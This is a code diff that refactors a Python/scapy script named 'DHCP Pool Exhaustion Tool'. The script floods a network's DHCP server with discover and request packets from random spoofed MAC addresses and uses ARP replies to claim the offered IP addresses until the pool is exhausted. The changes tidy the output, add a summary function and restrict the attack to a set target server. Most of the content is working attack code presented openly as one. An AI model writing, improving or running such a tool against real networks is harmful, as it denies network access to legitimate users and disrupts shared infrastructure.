@@ -2,7 +2,6 @@
 import argparse
 import random
 import threading
-import sys
 import netifaces
 from scapy.all import *
 from scapy.layers.dhcp import BOOTP, DHCP
@@ -40,7 +39,6 @@ def send_discover(fake_mac, iface):
     pkt /= DHCP(options=[("message-type", "discover"),
                          "end"])
     sendp(pkt, iface=iface)
-    print("discover sent")
 
 
 def send_request(wanted_ip, fake_mac, srv_ip, iface):
@@ -57,7 +55,6 @@ def send_request(wanted_ip, fake_mac, srv_ip, iface):
                  ("requested_addr", wanted_ip),
                  "end"])
     sendp(pkt, iface=iface)
-    print('request sent')
 
 
 def send_arp(claimed_ip, fake_mac, srv_ip, srv_mac, iface):
@@ -72,10 +69,16 @@ def wait_for_enter():
     print("\n[!] Enter pressed - stopping attack...")
 
 
+def print_summary(captured):
+    print("\n[*] Attack finished")
+    print(f"[*] Total IPs captured: {len(captured)}")
+    for entry in captured:
+        print(f"    {entry['ip']} -> {entry['mac']}")
+
 def exhaust_dhcp():
     global stop_attack
     
-    # Start thread to listen for Enter key
+    # thread for enter
     enter_thread = threading.Thread(target=wait_for_enter, daemon=True)
     enter_thread.start()
     
@@ -91,7 +94,6 @@ def exhaust_dhcp():
     print("[*] Starting DHCP exhaustion... (Press Enter to stop)\n")
     
     captured = []
-    current_src = 0
     
     # Get server MAC
     srv_mac = sr1(ARP(op=1, pdst=str(target)), timeout=2, verbose=0)
@@ -103,23 +105,17 @@ def exhaust_dhcp():
     
     while True:
         if stop_attack:
-            print("\n[*] Attack stopped by user")
-            print(f"[*] Total IPs captured: {len(captured)}")
-            for entry in captured:
-                print(f"    {entry['ip']} -> {entry['mac']}")
+            print_summary(captured)
             return
             
         attempts = 0
         hw = RandMAC()
-        # Send discover
+        # send discover dhcp packets
         send_discover(fake_mac=hw, iface=iface)
         
         while True:
             if stop_attack:
-                print("\n[*] Attack stopped by user")
-                print(f"[*] Total IPs captured: {len(captured)}")
-                for entry in captured:
-                    print(f"    {entry['ip']} -> {entry['mac']}")
+                print_summary(captured)
                 return
                 
             # Sniff for response with timeout
@@ -127,11 +123,7 @@ def exhaust_dhcp():
             
             if not len(response):
                 if attempts >= 3:
-                    # No answer after 3 tries - pool exhausted
-                    print("\n[*] Attack finished - pool exhausted")
-                    print(f"[*] Total IPs captured: {len(captured)}")
-                    for entry in captured:
-                        print(f"    {entry['ip']} -> {entry['mac']}")
+                    print_summary(captured)
                     return
                 attempts += 1
                 print(f"retrying ({attempts}/3)")
@@ -144,11 +136,7 @@ def exhaust_dhcp():
                     offered_ip = response[0][BOOTP].yiaddr
                     from_ip = response[0][IP].src
                     
-                    if not target and not from_ip == current_src:
-                        current_src = from_ip
-                        srv_mac = sr1(ARP(op=1, pdst=str(from_ip)), timeout=2, verbose=0)[ARP].hwsrc
-                    
-                    if from_ip == target or not target:
+                    if from_ip == target:
                         break
                     continue
         
@@ -164,10 +152,10 @@ def exhaust_dhcp():
 
 if __name__ == "__main__":
 
-    argparse = argparse.ArgumentParser(description="DHCP Pool Exhaustion Tool")
-    argparse.add_argument('-i', '--iface', metavar="IFACE", default=get_default_interface(), type=str,
-                          help='Network interface to use')
-    args = argparse.parse_args()
+    argparsing = argparse.ArgumentParser(description="DHCP Pool Exhaustion Tool")
+    argparsing.add_argument('-i', '--iface', metavar="IFACE", default=get_default_interface(), type=str,
+                            help='Network interface to use')
+    args = argparsing.parse_args()
 
     conf.iface = args.iface
     
